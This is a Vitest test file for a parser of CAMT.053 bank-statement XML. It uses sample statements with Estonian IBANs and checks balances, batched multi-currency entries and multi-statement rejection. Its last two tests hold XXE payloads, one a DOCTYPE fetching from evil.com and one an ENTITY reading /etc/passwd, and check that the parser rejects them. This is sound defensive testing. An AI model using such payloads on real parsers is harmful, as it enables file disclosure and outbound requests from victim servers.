import { describe, it, expect } from "vitest";
import { parseCamt053Xml } from "./camt-import.js";

const sampleXml = `<?xml version="1.0" encoding="UTF-8"?>
<Document xmlns="urn:iso:std:iso:20022:tech:xsd:camt.053.001.02">
  <BkToCstmrStmt>
    <Stmt>
      <Id>sample-statement</Id>
      <FrToDt>
        <FrDtTm>2026-02-01T00:00:00+02:00</FrDtTm>
        <ToDtTm>2026-02-28T23:59:59+02:00</ToDtTm>
      </FrToDt>
      <Acct>
        <Id>
          <IBAN>EE637700771011212909</IBAN>
        </Id>
        <Ccy>EUR</Ccy>
        <Svcr>
          <FinInstnId>
            <BIC>LHVBEE22</BIC>
            <Nm>AS LHV Pank</Nm>
          </FinInstnId>
        </Svcr>
      </Acct>
      <Bal>
        <Tp>
          <CdOrPrtry>
            <Cd>OPBD</Cd>
          </CdOrPrtry>
        </Tp>
        <Amt Ccy="EUR">128.73</Amt>
        <CdtDbtInd>CRDT</CdtDbtInd>
        <Dt>
          <Dt>2026-02-01</Dt>
        </Dt>
      </Bal>
      <Bal>
        <Tp>
          <CdOrPrtry>
            <Cd>CLBD</Cd>
          </CdOrPrtry>
        </Tp>
        <Amt Ccy="EUR">170.03</Amt>
        <CdtDbtInd>CRDT</CdtDbtInd>
        <Dt>
          <Dt>2026-02-28</Dt>
        </Dt>
      </Bal>
      <Ntry>
        <Amt Ccy="EUR">150.00</Amt>
        <CdtDbtInd>CRDT</CdtDbtInd>
        <BookgDt>
          <Dt>2026-02-01</Dt>
        </BookgDt>
        <AcctSvcrRef>68247FE392FFF011B469001DD8D11D14</AcctSvcrRef>
        <NtryDtls>
          <TxDtls>
            <Refs>
              <AcctSvcrRef>68247FE392FFF011B469001DD8D11D14</AcctSvcrRef>
              <InstrId>982</InstrId>
            </Refs>
            <AmtDtls>
              <TxAmt>
                <Amt Ccy="EUR">150.00</Amt>
              </TxAmt>
            </AmtDtls>
            <RltdPties>
              <Dbtr>
                <Nm>Seppo OÜ</Nm>
                <Id>
                  <OrgId>
                    <Othr>
                      <Id>14417608</Id>
                      <SchmeNm>
                        <Cd>COID</Cd>
                      </SchmeNm>
                    </Othr>
                  </OrgId>
                </Id>
              </Dbtr>
              <DbtrAcct>
                <Id>
                  <IBAN>EE307700771002928927</IBAN>
                </Id>
              </DbtrAcct>
              <Cdtr>
                <Nm>Seppo AI OÜ</Nm>
              </Cdtr>
              <CdtrAcct>
                <Id>
                  <IBAN>EE637700771011212909</IBAN>
                </Id>
              </CdtrAcct>
            </RltdPties>
            <RmtInf>
              <Ustrd>laen tagasi</Ustrd>
            </RmtInf>
          </TxDtls>
        </NtryDtls>
      </Ntry>
      <Ntry>
        <Amt Ccy="EUR">240.00</Amt>
        <CdtDbtInd>DBIT</CdtDbtInd>
        <BookgDt>
          <Dt>2026-02-01</Dt>
        </BookgDt>
        <AcctSvcrRef>1EE3850193FFF011B469001DD8D11D14</AcctSvcrRef>
        <NtryDtls>
          <TxDtls>
            <Refs>
              <AcctSvcrRef>1EE3850193FFF011B469001DD8D11D14</AcctSvcrRef>
              <InstrId>190</InstrId>
              <EndToEndId>1753691085</EndToEndId>
            </Refs>
            <AmtDtls>
              <TxAmt>
                <Amt Ccy="EUR">240.00</Amt>
              </TxAmt>
            </AmtDtls>
            <RltdPties>
              <Dbtr>
                <Nm>Seppo AI OÜ</Nm>
              </Dbtr>
              <DbtrAcct>
                <Id>
                  <IBAN>EE637700771011212909</IBAN>
                </Id>
              </DbtrAcct>
              <Cdtr>
                <Nm>OÜ Meening</Nm>
                <Id>
                  <OrgId>
                    <Othr>
                      <Id>14999999</Id>
                      <SchmeNm>
                        <Cd>COID</Cd>
                      </SchmeNm>
                    </Othr>
                  </OrgId>
                </Id>
              </Cdtr>
              <CdtrAcct>
                <Id>
                  <IBAN>EE927700771006313596</IBAN>
                </Id>
              </CdtrAcct>
            </RltdPties>
            <RmtInf>
              <Ustrd>arve nr 99</Ustrd>
              <Strd>
                <CdtrRefInf>
                  <Ref>44407737</Ref>
                </CdtrRefInf>
              </Strd>
            </RmtInf>
          </TxDtls>
        </NtryDtls>
      </Ntry>
      <Ntry>
        <Amt Ccy="EUR">0.14</Amt>
        <CdtDbtInd>DBIT</CdtDbtInd>
        <BookgDt>
          <Dt>2026-02-02</Dt>
        </BookgDt>
        <AcctSvcrRef>321BA8DEECFFF011B469001DD8D11D14</AcctSvcrRef>
        <NtryDtls>
          <TxDtls>
            <Refs>
              <AcctSvcrRef>321BA8DEECFFF011B469001DD8D11D14</AcctSvcrRef>
            </Refs>
            <AmtDtls>
              <TxAmt>
                <Amt Ccy="EUR">0.14</Amt>
              </TxAmt>
            </AmtDtls>
            <RmtInf>
              <Ustrd>Google CLOUD RJCPGD</Ustrd>
            </RmtInf>
          </TxDtls>
        </NtryDtls>
      </Ntry>
    </Stmt>
  </BkToCstmrStmt>
</Document>`;

const batchedMixedCurrencyXml = `<?xml version="1.0" encoding="UTF-8"?>
<Document xmlns="urn:iso:std:iso:20022:tech:xsd:camt.053.001.02">
  <BkToCstmrStmt>
    <Stmt>
      <Id>batched-statement</Id>
      <Acct>
        <Id>
          <IBAN>EE637700771011212909</IBAN>
        </Id>
        <Ccy>EUR</Ccy>
      </Acct>
      <Ntry>
        <Amt Ccy="EUR">27.00</Amt>
        <CdtDbtInd>DBIT</CdtDbtInd>
        <BookgDt>
          <Dt>2026-02-03</Dt>
        </BookgDt>
        <AcctSvcrRef>BATCH-REF-001</AcctSvcrRef>
        <NtryDtls>
          <TxDtls>
            <Refs>
              <AcctSvcrRef>BATCH-REF-001-A</AcctSvcrRef>
            </Refs>
            <AmtDtls>
              <TxAmt>
                <Amt Ccy="USD">10.00</Amt>
              </TxAmt>
            </AmtDtls>
            <RltdPties>
              <Cdtr>
                <Nm>Vendor One</Nm>
              </Cdtr>
            </RltdPties>
            <RmtInf>
              <Ustrd>Batch row 1</Ustrd>
            </RmtInf>
          </TxDtls>
        </NtryDtls>
        <NtryDtls>
          <TxDtls>
            <Refs>
              <AcctSvcrRef>BATCH-REF-001-B</AcctSvcrRef>
            </Refs>
            <AmtDtls>
              <TxAmt>
                <Amt Ccy="USD">20.00</Amt>
              </TxAmt>
            </AmtDtls>
            <RltdPties>
              <Cdtr>
                <Nm>Vendor Two</Nm>
              </Cdtr>
            </RltdPties>
            <RmtInf>
              <Ustrd>Batch row 2</Ustrd>
            </RmtInf>
          </TxDtls>
        </NtryDtls>
      </Ntry>
    </Stmt>
  </BkToCstmrStmt>
</Document>`;

const multiStatementXml = `<?xml version="1.0" encoding="UTF-8"?>
<Document xmlns="urn:iso:std:iso:20022:tech:xsd:camt.053.001.02">
  <BkToCstmrStmt>
    <Stmt>
      <Id>stmt-1</Id>
      <Acct>
        <Id>
          <IBAN>EE111111111111111111</IBAN>
        </Id>
      </Acct>
    </Stmt>
    <Stmt>
      <Id>stmt-2</Id>
      <Acct>
        <Id>
          <IBAN>EE222222222222222222</IBAN>
        </Id>
      </Acct>
    </Stmt>
  </BkToCstmrStmt>
</Document>`;

describe("parseCamt053Xml", () => {
  it("parses statement metadata and entry direction mapping data", () => {
    const result = parseCamt053Xml(sampleXml);

    expect(result.statement_metadata.iban).toBe("EE637700771011212909");
    expect(result.statement_metadata.bank_bic).toBe("LHVBEE22");
    expect(result.statement_metadata.opening_balance?.amount).toBe(128.73);
    expect(result.statement_metadata.closing_balance?.amount).toBe(170.03);
    expect(result.summary.entry_count).toBe(3);
    expect(result.summary.credit_total).toBe(150);
    expect(result.summary.debit_total).toBe(240.14);

    expect(result.entries[0]).toMatchObject({
      date: "2026-02-01",
      amount: 150,
      direction: "CRDT",
      counterparty_name: "Seppo OÜ",
      counterparty_iban: "EE307700771002928927",
      counterparty_reg_code: "14417608",
      description: "laen tagasi",
      bank_reference: "68247FE392FFF011B469001DD8D11D14",
      duplicate: false,
    });

    expect(result.entries[1]).toMatchObject({
      direction: "DBIT",
      counterparty_name: "OÜ Meening",
      counterparty_iban: "EE927700771006313596",
      counterparty_reg_code: "14999999",
      description: "arve nr 99",
      reference_number: "44407737",
      end_to_end_id: "1753691085",
    });

    expect(result.entries[2]).toMatchObject({
      direction: "DBIT",
      description: "Google CLOUD RJCPGD",
      counterparty_name: undefined,
      counterparty_iban: undefined,
    });
  });

  it("splits batched entries across all NtryDtls blocks and keeps the booked entry amount in account currency", () => {
    const result = parseCamt053Xml(batchedMixedCurrencyXml);

    expect(result.summary.entry_count).toBe(2);
    expect(result.summary.debit_total).toBe(27);
    expect(result.entries).toMatchObject([
      {
        amount: 9,
        currency: "EUR",
        original_amount: 10,
        original_currency: "USD",
        counterparty_name: "Vendor One",
        description: "Batch row 1",
        bank_reference: "BATCH-REF-001-A",
      },
      {
        amount: 18,
        currency: "EUR",
        original_amount: 20,
        original_currency: "USD",
        counterparty_name: "Vendor Two",
        description: "Batch row 2",
        bank_reference: "BATCH-REF-001-B",
      },
    ]);
  });

  it("suggests splitting the file when multiple statements are present", () => {
    expect(() => parseCamt053Xml(multiStatementXml)).toThrow(
      /Split multi-statement CAMT exports into separate XML files and import them one statement at a time/,
    );
  });

  it("rejects XML containing DOCTYPE declarations", () => {
    const malicious = `<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://evil.com/xxe"><Document></Document>`;
    expect(() => parseCamt053Xml(malicious)).toThrow(/must not contain DOCTYPE or ENTITY/);
  });

  it("rejects XML containing ENTITY declarations", () => {
    const malicious = `<?xml version="1.0"?><!ENTITY xxe SYSTEM "file:///etc/passwd"><Document></Document>`;
    expect(() => parseCamt053Xml(malicious)).toThrow(/must not contain DOCTYPE or ENTITY/);
  });
});
